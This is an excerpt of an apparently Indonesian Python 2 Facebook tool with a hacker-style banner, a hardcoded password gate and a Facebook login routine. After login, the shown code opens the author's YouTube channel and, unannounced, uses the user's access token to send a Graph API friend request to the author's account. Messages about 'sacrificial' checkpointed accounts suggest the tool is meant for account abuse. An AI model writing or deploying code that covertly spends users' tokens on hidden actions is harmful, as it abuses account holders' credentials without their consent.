...
──────────────────────────────────────────
\x1b[1;97m--------------------------------------------------------------
\x1b[1;94m➣  YouTube  : ITSMEIKY
\x1b[1;94m➣  Facebook : RIZKY MAULANA HALILINTAR XD
\x1b[1;94m➣  GIFT     :  ITSMEIKY
\x1b[1;94m➣  Github   : KEPO LO ANJINC AWKWKKW
\x1b[1;94m➣  Instagram : ITSMEIKY1
...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mTunggu Bentar Sayang\x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "\033[1;97mSukses Please Wait..... "#Dev:XP_TRICKER
	    time.sleep(1)
            loop = 'false'
        else:
            print "\033[1;97mGAGAL BODOH LU MASUKAN PW SALAH"
...
def login():
	...
	try:
		...
		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mItsmeiky The King Of Facebook' ) 
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\x1b[1;97mOkee Masuk Tunggu Sebentar Sayang...'
				os.system('xdg-open https://m.youtube.com/channel/UCliEHmQxdnSc9cTOKD32SQA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mJaringan Lu Lemah Coba Sekali Lagi"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;31mAkun Tumbal Kau Cp Bodoh")
...
---------------------------------------------------------"""		
	...
	print '\033[1;97mSudahh Silahkah Kembalii Atau Logout.'
	print"\033[1;97m-----------------"
